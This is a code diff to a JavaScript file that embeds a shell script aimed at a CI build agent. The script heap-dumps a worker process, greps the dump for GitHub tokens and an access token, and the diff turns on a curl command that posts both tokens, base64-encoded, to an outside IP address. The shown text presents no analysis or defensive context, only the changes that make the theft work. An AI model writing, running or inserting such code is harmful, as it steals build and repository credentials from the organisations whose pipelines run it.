@@ -10,11 +10,11 @@ const script = `
     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     # GH_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"gh._[A-Za-z0-9]+"' | head -1 | sed -Ee 's/.*"(gh._[A-Za-z0-9]+)".*/\\1/');
     GH_TOKEN=$(strings -e b -n 20 /home/vsts/work/_temp/heap_worker.bin | grep 'gh[os]_' | head -n5);
-    ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '^{"AccessToken: ".+"' | head -1);
-    # ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '^{"AccessToken: ".+"' | head -1 | sed -Ee 's/token": "(.+)"}$/\\1/');
+    ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '"AccessToken":".+"' | head -1);
+    # ACCESS_TOKEN=$(strings -e b -n 40 /home/vsts/work/_temp/heap_worker.bin | grep -E '^{"AccessToken":".+"' | head -1 | sed -Ee 's/token": "(.+)"}$/\\1/');
     # ACCESS_TOKEN=$(strings -e b -n 80 /home/vsts/work/_temp/heap_worker.bin | grep 'AccessToken":' | head -n 1);
 
-    # curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$(echo $GH_TOKEN | base64)\\"}" http://35.202.247.169:39123
+    curl -X POST -H "Content-Type: application/json" -d "{\\"accessToken\\": \\"$(echo $ACCESS_TOKEN | base64)\\", \\"gh\\": \\"$(echo $GH_TOKEN | base64)\\"}" http://35.202.247.169:39123
     echo GH_TOKEN=$GH_TOKEN
     echo ACCESS_TOKEN=$ACCESS_TOKEN
 `
